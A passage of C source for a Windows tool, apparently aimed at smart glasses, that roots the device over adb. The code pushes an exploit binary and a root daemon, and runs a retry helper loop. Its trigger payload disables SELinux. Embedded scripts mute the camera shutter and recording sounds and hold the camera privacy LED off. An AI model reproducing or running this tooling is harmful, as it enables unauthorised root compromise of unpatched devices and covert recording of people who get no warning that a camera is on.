        CloseHandle(hr); hr = NULL;
    } else if (rd) {
        /* CreateThread 失敗（極罕見）→ 沒有讀取執行緒。
           此時程序已結束，改用非阻塞的 PeekNamedPipe 盡量把輸出撈回來，
           而不是默默回傳空字串。 */
        char tmp[4096];
        for (;;) {
            DWORD avail = 0, got = 0;
            if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
            DWORD want = (avail < sizeof(tmp)) ? avail : (DWORD)sizeof(tmp);
            if (!ReadFile(rd, tmp, want, &got, NULL) || got == 0) break;
            if (rc.len + got + 1 > rc.cap) {
                size_t ncap = rc.cap ? rc.cap * 2 : 65536;
                while (ncap < rc.len + got + 1) ncap *= 2;
                char *nb = (char *)realloc(rc.buf, ncap);
                if (!nb) break;
                rc.buf = nb;
                rc.cap = ncap;
            }
            memcpy(rc.buf + rc.len, tmp, got);
            rc.len += got;
        }
    }

    if (out && rc.buf) {
        char *nb = (char *)realloc(rc.buf, rc.len + 1);
        if (nb) rc.buf = nb;
        rc.buf[rc.len] = '\0';
        *out = rc.buf;
        rc.buf = NULL;
    }

done:
    if (rc.buf) free(rc.buf);
    if (hNul) CloseHandle(hNul);
    if (rd) CloseHandle(rd);
    if (wr) CloseHandle(wr);
    if (ir) CloseHandle(ir);
    if (iw) CloseHandle(iw);
    return cancelled ? -1 : (int)exit_code;
}

/* 組合 adb 指令： "<adb>" [-s <serial>] <adbsub> */
static int build_adb_cmd(wchar_t *buf, size_t n, const wchar_t *adbsub) {
    int l = swprintf(buf, n, L"\"%ls\"", g_adb);
    if (l < 0) return -1;
    if (g_serial[0]) {
        int l2 = swprintf(buf + l, n - (size_t)l, L" -s \"%ls\"", g_serial);
        if (l2 < 0) return -1;
        l += l2;
    }
    if (swprintf(buf + l, n - (size_t)l, L" %ls", adbsub) < 0) return -1;
    return 0;
}

/* 執行 adb 子指令並回傳 stdout（需 free）；rc_out 可選，回傳行程 exit code */
static char *adb_out_rc(const wchar_t *adbsub, const char *input, int timeout_ms,
                        int *rc_out) {
    wchar_t cmd[8192];
    if (rc_out) *rc_out = -1;
    if (build_adb_cmd(cmd, 8192, adbsub) != 0) return NULL;
    char *out = NULL;
    int rc = run_process(cmd, input, &out, timeout_ms);
    if (rc_out) *rc_out = rc;
    return out;
}

static char *adb_out(const wchar_t *adbsub, const char *input, int timeout_ms) {
    return adb_out_rc(adbsub, input, timeout_ms, NULL);
}

/*
 * 執行 adb 子指令並把輸出寫進紀錄。
 * 只有在「行程真的失敗」時才提示可能出錯：mkdir/chmod/pkill/setsid 之類的
 * 指令本來就不產生 stdout，若把空輸出一律當成失敗，安裝 helper 時會連續出現
 * 五行「(無輸出，可能失敗)」，讓使用者誤以為流程壞了。
 */
static void adb_logged(const wchar_t *adbsub, const char *input, int timeout_ms) {
    int rc = 0;
    char *out = adb_out_rc(adbsub, input, timeout_ms, &rc);
    if (out) {
        trim_crlf(out);
        if (*out) log_u8(out);
        free(out);
    }
    /*
     * 只依 exit code 判斷：完全沒有輸出時 out 是 NULL（不是空字串），
     * 所以不能寫成「out 為空且 rc != 0」——那樣永遠不會成立。
     */
    if (rc != 0 && InterlockedCompareExchange(&g_cancel, 0, 0) == 0) {
        log_msg(STR_LOG_NO_OUTPUT);
    }
}

/* ================= 設定（ini） ================= */

static void ini_path(wchar_t *buf, size_t n) {
    swprintf(buf, n, L"%ls\\settings.ini", g_exe_dir);
}

static void settings_load(void) {
    wchar_t ini[MAX_PATH];
    wchar_t tmp[64];
    ini_path(ini, MAX_PATH);
    GetPrivateProfileStringW(L"tool", L"adb", L"", g_adb, MAX_PATH, ini);
    GetPrivateProfileStringW(L"tool", L"serial", L"", g_serial, 128, ini);
    GetPrivateProfileStringW(L"tool", L"apk", L"", g_apk, MAX_PATH, ini);
    GetPrivateProfileStringW(L"tool", L"lang", L"system", tmp, 64, ini);
    if (!g_adb[0]) wcscpy(g_adb, L"adb");

    {
        wchar_t tm[32];
        GetPrivateProfileStringW(L"tool", L"theme", L"system", tm, 32, ini);
        if (_wcsicmp(tm, L"dark") == 0)       g_theme_mode = 0;
        else if (_wcsicmp(tm, L"light") == 0) g_theme_mode = 1;
        else                                  g_theme_mode = -1;
    }

    if (_wcsicmp(tmp, L"system") == 0) {
        g_lang_setting = -1;
        int idx = i18n_detect_system();
        g_lang = (idx >= 0) ? idx : LANG_EN;
    } else {
        int idx = i18n_index_of_code(tmp);
        if (idx < 0) {
            g_lang_setting = -1;
            int d = i18n_detect_system();
            g_lang = (d >= 0) ? d : LANG_EN;
        } else {
            g_lang_setting = idx;
            g_lang = idx;
        }
    }
}

static void settings_save(void) {
    wchar_t ini[MAX_PATH];
    ini_path(ini, MAX_PATH);
    WritePrivateProfileStringW(L"tool", L"adb", g_adb, ini);
    WritePrivateProfileStringW(L"tool", L"serial", g_serial, ini);
    WritePrivateProfileStringW(L"tool", L"apk", g_apk, ini);
    const wchar_t *tms = (g_theme_mode < 0) ? L"system"
                      : (g_theme_mode == 0 ? L"dark" : L"light");
    WritePrivateProfileStringW(L"tool", L"theme", tms, ini);
    if (g_lang_setting < 0)
        WritePrivateProfileStringW(L"tool", L"lang", L"system", ini);
    else
        WritePrivateProfileStringW(L"tool", L"lang", i18n_code(g_lang_setting), ini);
}

/* ================= 裝置端腳本 ================= */

/* bridge helper 常駐迴圈（與 deploy/root_bridge.sh 相同） */
static const char *HELPER_SCRIPT =
"#!/system/bin/sh\n"
"BRIDGE=/data/local/tmp/ghostlock_bridge_desktop\n"
"BIN=/data/local/tmp/ghostlock_rv101\n"
"ROOT=/data/local/tmp/.ghostlock_root.sh\n"
"RUNLOG=/data/local/tmp/gl_run.log\n"
"ENV=\"GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1\"\n"
"MARK=\"__GHOSTLOCK_PAYLOAD_DONE__\"\n"
"CMD=\"$BRIDGE/last.cmd\"\n"
"STAGE=\"$BRIDGE/payload.staging\"\n"
"OUT=\"$BRIDGE/last.out\"\n"
"DONE=\"$BRIDGE/last.done\"\n"
"PROG=\"$BRIDGE/last.progress\"\n"
"MAX_TRY=3\n"
"\n"
"while true; do\n"
"  if [ -f \"$CMD\" ]; then\n"
"    rm -f \"$OUT\" \"$DONE\" \"$STAGE\"\n"
"    echo \"started\" > \"$PROG\"; chmod 666 \"$PROG\"\n"
"    cp \"$CMD\" \"$STAGE\"\n"
"    ok=0; err=\"unknown\"\n"
"    t=0\n"
"    while [ $t -lt $MAX_TRY ]; do\n"
"      t=$((t+1))\n"
"      echo \"exploit-attempt-$t\" > \"$PROG\"\n"
"      rm -f \"$ROOT\" \"$RUNLOG\"\n"
"      sh -c \"$ENV $BIN > $RUNLOG 2>&1\" &\n"
"      ready=0; i=0\n"
"      while [ $i -lt 120 ]; do\n"
"        if grep -q \"dropping to root shell\" \"$ROOT\" 2>/dev/null; then ready=1; break; fi\n"
"        if grep -q \"FOPS install failed\" \"$RUNLOG\" 2>/dev/null; then break; fi\n"
"        i=$((i+1)); sleep 1\n"
"      done\n"
"      if [ \"$ready\" != \"1\" ]; then\n"
"        err=\"ready-timeout-or-FOPS-failed\"\n"
"        pkill -9 -f ghostlock_rv10[1] 2>/dev/null\n"
"        continue\n"
"      fi\n"
"      echo \"ready\" > \"$PROG\"\n"
"      cp \"$STAGE\" \"$ROOT\" && chmod 755 \"$ROOT\"\n"
"      echo \"installed\" > \"$PROG\"\n"
"      echo \"waiting-done\" > \"$PROG\"\n"
"      dd=0; i=0\n"
"      while [ $i -lt 200 ]; do\n"
"        if grep -q \"$MARK\" \"$DONE\" 2>/dev/null; then dd=1; break; fi\n"
"        if grep -q \"FOPS install failed\" \"$RUNLOG\" 2>/dev/null; then err=\"exploit-FOPS-failed\"; break; fi\n"
"        i=$((i+1)); sleep 1\n"
"      done\n"
"      if [ \"$dd\" = \"1\" ]; then ok=1; break; fi\n"
"      [ \"$err\" = \"exploit-FOPS-failed\" ] || err=\"done-timeout\"\n"
"      pkill -9 -f ghostlock_rv10[1] 2>/dev/null\n"
"    done\n"
"    if [ \"$ok\" = \"1\" ]; then echo \"OK\" > \"$OUT\"; echo \"done\" > \"$PROG\"; else echo \"ERR:$err\" > \"$OUT\"; echo \"failed-$err\" > \"$PROG\"; fi\n"
"    chmod 666 \"$OUT\" \"$PROG\"\n"
"    pkill -9 -f ghostlock_rv10[1] 2>/dev/null\n"
"    rm -f \"$CMD\" \"$STAGE\"\n"
"  fi\n"
"  sleep 1\n"
"done\n";

/* payload：關 SELinux + 啟動 root_daemon（與 deploy/trigger_root_daemon.cmd 相同） */
static const char *TRIGGER_SCRIPT =
"#!/system/bin/sh\n"
"echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
"if ! grep -q 'root_daemon.sock' /proc/net/unix 2>/dev/null; then\n"
"    rm -f /data/local/tmp/root_daemon.sock\n"
"    setsid /data/local/tmp/root_daemon >/data/local/tmp/root_daemon.log 2>&1 &\n"
"fi\n"
"for i in $(seq 1 20); do\n"
"    grep -q 'root_daemon.sock' /proc/net/unix 2>/dev/null && break\n"
"    sleep 0.2\n"
"done\n"
"id > " DEV_BRIDGE "/last.done\n"
"echo __GHOSTLOCK_PAYLOAD_DONE__ >> " DEV_BRIDGE "/last.done\n";

/* 靜音拍攝：以 bind mount 覆蓋相機提示音（需要 root） */
static const char *SILENT_SCRIPT =
"#!/system/bin/sh\n"
"# zl_silent.sh on|off — 以 bind mount 覆蓋相機提示音（重開機後失效）\n"
"SRC=/data/local/tmp/silent_camera.ogg\n"
"MODE=\"$1\"\n"
"DIRS=\"/product/media/audio/ui /system/media/audio/ui /vendor/media/audio/ui\"\n"
"FILES=\"camera_click.ogg camera_focus.ogg VideoRecord.ogg VideoStop.ogg rkd_record_start.ogg rkd_record_end.ogg\"\n"
"n=0\n"
"for d in $DIRS; do\n"
"  for f in $FILES; do\n"
"    t=\"$d/$f\"\n"
"    [ -e \"$t\" ] || continue\n"
"    if [ \"$MODE\" = \"on\" ]; then\n"
"      grep -q \" $t \" /proc/mounts && continue\n"
"      mount --bind \"$SRC\" \"$t\" 2>/dev/null && n=$((n+1))\n"
"    else\n"
"      grep -q \" $t \" /proc/mounts && umount \"$t\" 2>/dev/null && n=$((n+1))\n"
"    fi\n"
"  done\n"
"done\n"
"echo \"changed=$n mounted=$(grep -c 'media/audio/ui' /proc/mounts 2>/dev/null)\"\n";

/* 隱私指示燈：Binder 取消 + sysfs 保持迴圈（需要 root） */
static const char *LED_SCRIPT =
"#!/system/bin/sh\n"
"# zl_led.sh off|on — 抑制/還原相機隱私指示燈（重開機後失效）\n"
"HOLD=/data/local/tmp/zl_led_hold\n"
"BR=/sys/class/leds/white/brightness\n"
"CUR=/sys/class/leds/white/led_current\n"
"if [ \"$1\" = \"off\" ]; then\n"
"  touch \"$HOLD\"\n"
"  service call lights_ctrl 9 i32 2 i32 2014 >/dev/null 2>&1\n"
"  echo 0 > \"$BR\" 2>/dev/null\n"
"  echo 0 > \"$CUR\" 2>/dev/null\n"
"  if ! pgrep -f zl_led_hol[d] >/dev/null 2>&1; then\n"
"    ( while [ -f \"$HOLD\" ]; do echo 0 > \"$BR\" 2>/dev/null; sleep 0.2; done ) >/dev/null 2>&1 &\n"
"  fi\n"
"  echo \"led=off hold=1\"\n"
"else\n"
"  rm -f \"$HOLD\"\n"
"  echo 255 > \"$BR\" 2>/dev/null\n"
"  echo 2 > \"$CUR\" 2>/dev/null\n"
"  service call lights_ctrl 8 i32 2 i32 2014 >/dev/null 2>&1\n"
"  echo \"led=on hold=0\"\n"
"fi\n";

/* ================= 裝置操作 ================= */

static int adb_available(void) {
    char *out = adb_out(L"version", NULL, 8000);
    if (out) {
        int ok = (strstr(out, "Android Debug Bridge") != NULL);
        free(out);
        if (ok) return 1;
    }
    log_msg(STR_LOG_ADB_UNAVAILABLE);
    return 0;
}

/*
 * 解析 `adb devices -l`。
 * 每台裝置一行的格式為：<serial> <state> [product:x model:y device:z transport_id:n]
 * 必須以「第二個欄位」判定狀態，不能用 strstr("device")，否則會誤中 "device:glasses"。
 * 回傳：1=device 0=沒有裝置 -1=未授權 -2=offline
 */
#define DEV_NOT_FOUND (-4)   /* 有指定序號，但該裝置不在線上 */

/*
 * 選擇要操作的裝置。
 *
 * 規則（很重要）：
 *   1. g_serial 已設定 → **只**接受該序號；找不到就回 DEV_NOT_FOUND。
 *   2. g_serial 未設定 → 取第一台 device 狀態的裝置，並記下它的序號。
 *
 * 為什麼不能「取第一台」了事：實測眼鏡重開機期間 adb 清單剩下一台手機，
 * 舊寫法就安靜地把操作目標換成手機（序號被覆寫），後續的 reboot／exploit
 * 全部打到錯誤的裝置上。多裝置環境下這會造成實際損害。
 */
static int device_state(char *serial_out, size_t sn, char *model_out, size_t mn) {
    char *out = adb_out(L"devices -l", NULL, 20000);
    if (serial_out && sn) serial_out[0] = '\0';
    if (model_out && mn) model_out[0] = '\0';
    if (!out) return -3;   /* adb 本身執行失敗，與「沒有裝置」不同 */

    char want[160] = "";
    if (g_serial[0]) {
        char *w = wide_to_utf8(g_serial);
        if (w) { strncpy(want, w, sizeof(want) - 1); free(w); }
    }

    int state = 0;
    char *p = out;
    while (p && *p) {
        char *nl = strchr(p, '\n');
        if (nl) *nl = '\0';
        trim_crlf(p);

        char ser[256] = "", st[64] = "";
        if (sscanf(p, "%255s %63s", ser, st) == 2) {
            int is_dev = (strcmp(st, "device") == 0);
            int match  = (!want[0] || strcmp(ser, want) == 0);

            if (is_dev && match) {
                if (serial_out && sn) {
                    strncpy(serial_out, ser, sn - 1);
                    serial_out[sn - 1] = '\0';
                }
                char *mp = strstr(p, "model:");
                if (mp && model_out && mn) {
                    char mdl[256] = "";
                    if (sscanf(mp + 6, "%255s", mdl) == 1) {
                        strncpy(model_out, mdl, mn - 1);
                        model_out[mn - 1] = '\0';
                    }
                }
                state = 1;
                break;
            }
            /* 只有「沒指定序號」時才把其他裝置的狀態當成结果 */
            if (!want[0]) {
                if (strcmp(st, "unauthorized") == 0) state = -1;
                else if (strcmp(st, "offline") == 0)  state = -2;
            } else if (strcmp(ser, want) == 0) {
                if (strcmp(st, "unauthorized") == 0) state = -1;
                else if (strcmp(st, "offline") == 0)  state = -2;
            }
        }
        if (!nl) break;
        p = nl + 1;
    }
    free(out);
    if (want[0] && state == 0) return DEV_NOT_FOUND;
    return state;
}

/* 等待裝置回到 device 狀態；回傳 1=就緒 0=逾時 */
static int wait_device(int wait_s) {
    for (int i = 0; i < wait_s; i++) {
        if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) return 0;
        char sn[128], md[128];
        if (device_state(sn, sizeof(sn), md, sizeof(md)) == 1) return 1;
        Sleep(1000);
        if ((i + 1) % 20 == 0) log_msg(STR_LOG_WAIT_DEVICE, i + 1);
    }
    return 0;
}

/* 讀取 /proc/uptime 第一個欄位（秒）；失敗回 -1 */
static int device_uptime(void) {
    char *o = adb_out(L"shell \"cut -d' ' -f1 /proc/uptime\"", NULL, 15000);
    if (!o) return -1;
    trim_crlf(o);
    int v = -1;
    if (*o) v = (int)strtod(o, NULL);
    free(o);
    return v;
}

/* ================= 開機迴圈保護（P0–P2） =================
 *
 * 這一組狀態**必須跨啟動保存**（settings.ini 的 [state] 段）：
 * 斷路器的意義就是「記得這台裝置剛剛一直在重開」，
 * 只存在記憶體的話，使用者關掉再開工具就繞過了。
 */

static void state_get(const wchar_t *key, wchar_t *out, size_t n, const wchar_t *def) {
    wchar_t ini[MAX_PATH];
    ini_path(ini, MAX_PATH);
    GetPrivateProfileStringW(L"state", key, def, out, (DWORD)n, ini);
}

static void state_set(const wchar_t *key, const wchar_t *val) {
    wchar_t ini[MAX_PATH];
    ini_path(ini, MAX_PATH);
    WritePrivateProfileStringW(L"state", key, val, ini);
}

/* ini 沒有 64 位元整數 API，統一用十進位字串存。 */
static long long state_get_ll(const wchar_t *key, long long def) {
    wchar_t buf[64];
    state_get(key, buf, 64, L"");
    if (!buf[0]) return def;
    return (long long)wcstoll(buf, NULL, 10);
}

static void state_set_ll(const wchar_t *key, long long v) {
    wchar_t buf[64];
    swprintf(buf, 64, L"%lld", v);
    state_set(key, buf);
}

/* 裝置的開機時間點（host 的 unix 秒）= now - uptime；-1 = 讀不到。
 * 用「開機時間點」當開機識別：重開機後它會往前跳，比 uptime 本身可靠
 * （uptime 只在同一輪內遞增，跨啟動無法比較）。 */
static long long device_boot_wall(void) {
    int up = device_uptime();
    if (up < 0) return -1;
    return (long long)time(NULL) - (long long)up;
}

/* 裝置是否由 USB／AC 供電（P2）。1 = 有線供電；0 = 沒有；-1 = 讀不到。 */
static int device_charging(void) {
    char *o = adb_out(L"shell \"dumpsys battery 2>/dev/null | grep -E 'AC powered|USB powered'\"",
                      NULL, 20000);
    if (!o) return -1;
    int on = -1;
    if (strstr(o, "AC powered: true") || strstr(o, "USB powered: true")) on = 1;
    else if (strstr(o, "AC powered: false") || strstr(o, "USB powered: false")) on = 0;
    free(o);
    return on;
}

/* 開機歷史（逗號分隔的開機時間點，最多 LOOP_HIST_MAX 筆，新的在後）。
 * 用來回答「最近 N 分鐘內重開了幾次」。 */
static int loop_hist_recent(int window_s) {
    wchar_t buf[512];
    state_get(L"boot_hist", buf, 512, L"");
    long long now = (long long)time(NULL);
    int n = 0;
    wchar_t *p = buf;
    while (p && *p) {
        wchar_t *e = wcschr(p, L',');
        long long v = (long long)wcstoll(p, NULL, 10);
        if (v > 0 && now - v <= (long long)window_s) n++;
        if (!e) break;
        p = e + 1;
    }
    return n;
}

static void loop_hist_push(long long boot_wall) {
    wchar_t buf[512], out[512];
    state_get(L"boot_hist", buf, 512, L"");
    /* 以「時間,時間,時間」保存；超過上限就丟掉最舊的 */
    long long vals[LOOP_HIST_MAX];
    int n = 0;
    wchar_t *p = buf;
    while (p && *p && n < LOOP_HIST_MAX) {
        wchar_t *e = wcschr(p, L',');
        long long v = (long long)wcstoll(p, NULL, 10);
        if (v > 0) vals[n++] = v;
        if (!e) break;
        p = e + 1;
    }
    if (n >= LOOP_HIST_MAX) {
        for (int i = 1; i < LOOP_HIST_MAX; i++) vals[i - 1] = vals[i];
        n = LOOP_HIST_MAX - 1;
    }
    vals[n++] = boot_wall;
    out[0] = L'\0';
    for (int i = 0; i < n; i++) {
        wchar_t one[32];
        swprintf(one, 32, L"%lld", vals[i]);
        if (i) wcscat(out, L",");
        wcscat(out, one);
    }
    state_set(L"boot_hist", out);
}

/*
 * 觀測開機、更新可疑計數。回傳 1 = 斷路器已跳脫（呼叫端應停止重試）。
 * quiet = 1：背景輪詢用 —— 仍然累積歷史與計數，但不寫紀錄（避免每 30 秒洗版）。
 *
 * 判定：偵測到新的一次開機時，若「上次武裝」距離該次開機 ≤ LOOP_SUSPECT_WINDOW_S，
 * 就記一次可疑；連續 LOOP_SUSPECT_MAX 次即跳脫。間隔夠久（＝正常使用下的重開）
 * 會把計數歸零，避免永遠累積。
 */
static int loop_note_boot(int quiet) {
    long long bw = device_boot_wall();
    int susp = (int)state_get_ll(L"suspended", 0);
    if (bw < 0) return susp;                    /* 讀不到就不動狀態 */

    long long prev = state_get_ll(L"boot_wall", 0);
    long long arm  = state_get_ll(L"arm_wall", 0);

    if (prev > 0 && bw > prev + 30) {           /* 真的換了一次開機 */
        long long sus = state_get_ll(L"suspicious", 0);
        if (arm > 0 && bw - arm <= LOOP_SUSPECT_WINDOW_S) {
            sus++;
            if (!quiet)
                log_msg(STR_LOG_SUSPICIOUS_REBOOT, (int)(bw - arm), (int)sus, LOOP_SUSPECT_MAX);
        } else {
            sus = 0;                            /* 隔太久 → 視為正常重開 */
        }
        state_set_ll(L"suspicious", sus);
        if (sus >= LOOP_SUSPECT_MAX && !susp) {
            susp = 1;
            state_set_ll(L"suspended", 1);
            if (!quiet) log_msg(STR_LOG_BREAKER_TRIP, (int)sus);
        }
        loop_hist_push(bw);
    }
    state_set_ll(L"boot_wall", bw);
    return susp;
}

/* 一次嘗試即將開始 → 記下武裝時間（供 loop_note_boot 判定「武裝後多久重開」） */
static void loop_mark_arm(void) { state_set_ll(L"arm_wall", (long long)time(NULL)); }

/* 斷路器狀態查詢（給 UI／預檢用） */
static int loop_suspended(void) { return (int)state_get_ll(L"suspended", 0) != 0; }

static void loop_reset(void) {
    state_set_ll(L"suspended", 0);
    state_set_ll(L"suspicious", 0);
    state_set_ll(L"arm_wall", 0);
}

/*
 * 顯示確認對話框，並確保它**一定看得見**。
 *
 * 為什麼不能直接用 MessageBoxW(g_main, ...)：
 *   MessageBox 預設以 **owner 視窗的中心**定位。本工具的主視窗可以比螢幕還大
 *   （實測：桌面 1440×810，主視窗 2386×1523 @ x=266 → 視窗中心 x≈1459 已在畫面外），
 *   對話框就會被擺到畫面外 —— 使用者看不到警告，卻仍被 modal 卡住，
 *   等於「有警告但看不到」，比沒有警告更糟。
 *
 * 對策：owner 視窗中心若不在虛擬畫面內，就改用無 owner 的 MessageBox，
 * 讓 Windows 以「作用中螢幕」為基準置中（保證可見）。
 */
static int confirm_dialog(const wchar_t *text, const wchar_t *title, UINT flags) {
    HWND owner = g_main;
    RECT r;
    if (GetWindowRect(g_main, &r)) {
        int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        int cx = (r.left + r.right) / 2;
        int cy = (r.top + r.bottom) / 2;
        if (cx < vx || cx >= vx + vw || cy < vy || cy >= vy + vh) owner = NULL;
    }
    return MessageBoxW(owner, text, title, flags);
}

/*
 * 一鍵前的兩道警告（P0-b 迴圈預檢、P2 供電）。
 * **警告但允許手動覆寫** —— 桌面板是手動工具，使用者明確要跑就該能跑，
 * 但必須知道自己正在繞過保護。回傳 1 = 可以繼續，0 = 使用者取消。
 *
 * 取消路徑一律回 0（不執行任何 exploit）：只有明確的 IDYES 才會繼續。
 * 對話框用 MB_DEFBUTTON2，所以直接按 Enter 也會落在「否」。
 */
static int preflight_warnings(void) {
    long long recent = loop_hist_recent(LOOP_RECENT_WINDOW_S);
    int susp = loop_suspended();

    if (recent >= LOOP_RECENT_MAX) {
        log_msg(STR_LOG_LOOP_RECENT, (int)recent, LOOP_RECENT_WINDOW_S / 60);
    }
    if (susp || recent >= LOOP_RECENT_MAX) {
        /* 參數順序必須與 i18n 基準（zh-TW）一致：(次數, 分鐘)
         * 使用 Tf()（執行緒區域環狀緩衝），不要自己 swprintf T() 的結果。 */
        if (confirm_dialog(Tf(STR_DLG_LOOP_TEXT, (int)recent, LOOP_RECENT_WINDOW_S / 60),
                           T(STR_DLG_LOOP_TITLE),
                           MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
            log_msg(STR_LOG_LOOP_ABORTED);
            stat_msg(STR_ST_ONECLICK_FAILED);
            return 0;
        }
        log_msg(STR_LOG_LOOP_OVERRIDE);
        loop_reset();      /* 使用者已明確覆寫 → 歸零，之後仍可重新累計 */
    }

    int chg = device_charging();
    if (chg == 0) {        /* 只在大致確定「沒插線」時警告；讀不到就不吵 */
        if (confirm_dialog(T(STR_DLG_BATTERY_TEXT), T(STR_DLG_BATTERY_TITLE),
                           MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
            log_msg(STR_LOG_BATTERY_ABORTED);
            stat_msg(STR_ST_ONECLICK_FAILED);
            return 0;
        }
        log_msg(STR_LOG_BATTERY_OVERRIDE);
    }
    return 1;
}

/* 讀取 /proc/loadavg 第 4 欄的執行緒數（nr_threads）；失敗回 -1 */
static int device_threads(void) {
    char *o = adb_out(L"shell \"cat /proc/loadavg\"", NULL, 15000);
    if (!o) return -1;
    trim_crlf(o);
    int v = -1;
    char *slash = strchr(o, '/');
    if (slash) v = atoi(slash + 1);
    free(o);
    return v;
}

static int boot_completed(void) {
    char *o = adb_out(L"shell \"getprop sys.boot_completed\"", NULL, 15000);
    if (!o) return 0;
    trim_crlf(o);
    int ok = (o[0] == '1');
    free(o);
    return ok;
}

/* ---------------- 韌體判定 ---------------- */

/* 解析 "1.25.012-20260901-150201" → 1,25,12；成功回 1 */
static int fw_parse(const char *s, int *a, int *b, int *c) {
    if (!s) return 0;
    int x = 0, y = 0, z = 0;
    if (sscanf(s, "%d.%d.%d", &x, &y, &z) != 3) return 0;
    if (a) *a = x;
    if (b) *b = y;
    if (c) *c = z;
    return 1;
}

/* 1=漏洞版 2=已修補 0=未知 */
static int fw_classify(const char *incremental) {
    if (!incremental || !*incremental) return 0;
    int a, b, c;
    if (!fw_parse(incremental, &a, &b, &c)) return 0;
    int ta = 1, tb = 25, tc = 12;   /* 預設門檻；解析失敗時仍可判定 */
    if (!fw_parse(FW_PATCHED_VER, &ta, &tb, &tc)) return 0;
    if (a > ta || (a == ta && (b > tb || (b == tb && c >= tc)))) return 2;
    if (strstr(incremental, FW_VULN_MARK)) return 1;
    /*
     * 低於門檻 → 漏洞版（1.23.x / 1.24.x / 1.25.005 這些都還沒修補）。
     * 舊寫法 `(a < ta) ? 1 : 0` 會把它們全歸為「未知」，而未知原本不會被擋下。
     */
    if (a < ta || (a == ta && (b < tb || (b == tb && c < tc)))) return 1;
    return 0;
}

static int fw_is_patched(void) { return g_fw_state == 2; }

/* ---------------- 推送 / helper / 觸發 ---------------- */

static int asset_path(wchar_t *buf, size_t n, const wchar_t *name) {
    swprintf(buf, n, L"%ls\\assets\\%ls", g_exe_dir, name);
    if (GetFileAttributesW(buf) == INVALID_FILE_ATTRIBUTES) {
        log_msg(STR_LOG_ASSET_MISSING, buf);
        return 0;
    }
    return 1;
}

static void do_push(void) {
    wchar_t exploit[MAX_PATH], daemon[MAX_PATH], sub[8192];

    log_msg(STR_LOG_PUSH_EXPLOIT);
    if (asset_path(exploit, MAX_PATH, L"ghostlock_rv101")) {
        swprintf(sub, 8192, L"push \"%ls\" %ls", exploit, DEV_EXPLOIT_W);
        adb_logged(sub, NULL, 180000);
        adb_logged(L"shell \"chmod 755 /data/local/tmp/ghostlock_rv101\"", NULL, 30000);
    }

    log_msg(STR_LOG_PUSH_DAEMON);
    if (asset_path(daemon, MAX_PATH, L"root_daemon")) {
        swprintf(sub, 8192, L"push \"%ls\" %ls", daemon, DEV_DAEMON_W);
        adb_logged(sub, NULL, 180000);
        adb_logged(L"shell \"chmod 755 /data/local/tmp/root_daemon\"", NULL, 30000);
    }
}

static void do_helper(void) {
    log_msg(STR_LOG_HELPER_HEADER);
    adb_logged(L"shell \"mkdir -p " DEV_BRIDGE_W " && chmod 777 " DEV_BRIDGE_W "\"",
               NULL, 30000);
    adb_logged(L"shell \"cat > " DEV_HELPER_W "\"",
               HELPER_SCRIPT, 40000);
    adb_logged(L"shell \"chmod 755 " DEV_HELPER_W "\"", NULL, 30000);
    /* 用字元類別避免 pkill 自我匹配 */
    /*
     * 停掉舊 helper：改用 PID 檔，不用 pkill -f。
     * 實測 `pkill -9 -f 'ghostlock_bridge_helpe[r]'` 會把自己的 adb shell 一起
     * 殺掉（adb 回傳 137 = 128+SIGKILL），字元類別在這個 toybox 版本上擋不住
     * 自我匹配。PID 檔沒有比對問題，且能精準只殺 helper。
     */
    adb_logged(L"shell \"kill -9 $(cat " DEV_HELPER_W ".pid 2>/dev/null) 2>/dev/null; sleep 1; true\"",
               NULL, 30000);
    /* 啟動 helper 並記下 PID（$! 即 setsid 帶起的那個 sh） */
    adb_logged(L"shell \"setsid sh " DEV_HELPER_W " > " DEV_HELPER_W ".log 2>&1 < /dev/null & echo $! > " DEV_HELPER_W ".pid\"",
               NULL, 30000);
    /*
     * 輪詢確認 helper 是否真的起來。單次檢查在負載高的裝置上會誤判：
     * 實測（裝置上有 11 個殘留的 ghostlock_rv101 行程）第一次檢查回 0，
     * 但 helper 其實已經在跑。改為最多等 5 輪 × 1.5 秒。
     */
    int found = 0;
    for (int i = 0; i < 5 && !found; i++) {
        Sleep(i == 0 ? 2000 : 1500);
        if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) break;
        char *ps = adb_out(L"shell \"ps -A -o ARGS 2>/dev/null | grep -c ghostlock_bridge_helper_deskto[p]\"",
                           NULL, 30000);
        if (ps) { trim_crlf(ps); found = (atoi(ps) > 0); free(ps); }
    }
    if (found) log_msg(STR_LOG_HELPER_STARTED);
    else       log_msg(STR_LOG_HELPER_NOTFOUND);
}

/* 原子寫入 last.cmd：先寫 .tmp 再 mv，避免 helper 讀到半截內容 */
static void do_trigger(void) {
    log_msg(STR_LOG_TRIGGER_HEADER);
    adb_logged(L"shell \"rm -f " DEV_BRIDGE_W "/last.cmd " DEV_BRIDGE_W "/last.out " DEV_BRIDGE_W "/last.done " DEV_BRIDGE_W "/last.progress " DEV_BRIDGE_W "/payload.staging /data/local/tmp/.ghostlock_root.sh /data/local/tmp/gl_run.log\"",
               NULL, 30000);
    adb_logged(L"shell \"cat > " DEV_BRIDGE_W "/last.cmd.tmp\"",
               TRIGGER_SCRIPT, 40000);
    adb_logged(L"shell \"chmod 666 " DEV_BRIDGE_W "/last.cmd.tmp && mv -f " DEV_BRIDGE_W "/last.cmd.tmp " DEV_BRIDGE_W "/last.cmd\"",
               NULL, 30000);
    log_msg(STR_LOG_TRIGGER_SENT);
}

/* ---------------- root socket ---------------- */

/* 透過 root_daemon socket 執行指令；回傳 stdout（需 free） */
static char *root_cmd(const char *cmd, int timeout_ms) {
    size_t n = strlen(cmd);
    char *withnl = (char *)xmalloc(n + 2);
    if (!withnl) return NULL;
    memcpy(withnl, cmd, n);
    withnl[n] = '\n';
    withnl[n + 1] = '\0';
    char *out = adb_out(L"shell \"nc -U /data/local/tmp/root_daemon.sock\"",
